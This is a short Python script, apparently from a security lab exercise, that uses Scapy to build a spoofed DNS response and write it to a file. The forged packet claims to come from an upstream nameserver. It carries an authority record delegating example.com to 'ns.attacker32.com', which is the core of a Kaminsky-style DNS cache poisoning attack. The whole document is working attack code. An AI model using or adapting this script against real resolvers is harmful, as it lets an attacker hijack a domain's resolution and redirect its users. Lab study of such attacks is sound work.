#!/usr/bin/env python3
from scapy.all import DNSQR, DNSRR, DNS, IP, UDP

# define the variebles
name = 'start.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'

# Construct the DNS header and payload
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=0, cd=0, qr=1,
          qdcount=1, ancount=1, nscount=1, arcount=0,
          qd=Qdsec, an=Anssec, ns=NSsec)
# Construct the IP, UDP headers, and the entire packet
ip = IP(dst='10.9.0.53', src='199.43.135.53', chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns
# Save the packet to a file
with open('res.bin', 'wb') as f:
    f.write(bytes(pkt))